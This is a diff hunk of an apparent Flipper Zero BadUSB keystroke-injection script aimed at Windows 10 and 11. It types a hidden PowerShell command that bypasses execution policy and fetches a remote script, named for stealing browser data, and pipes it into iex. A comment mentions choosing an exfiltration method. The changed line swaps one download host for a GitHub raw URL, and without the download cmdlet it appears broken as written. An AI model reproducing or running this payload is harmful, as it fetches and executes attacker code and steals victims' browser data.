@@ -8,7 +8,7 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell -w h -ep bypass $dc='';$db='';irm https://jakoby.lol/hgw | iex $dc
+STRING powershell -w h -ep bypass $dc='';$db='';raw.githubusercontent.com/Gonapar/Flipper-Zero-BadUSB/refs/heads/main/Payloads/Flip-BrowserData/browserData.ps1 | iex 
 ENTER
 
 REM     Fill in either variable or both to set your exfil method.
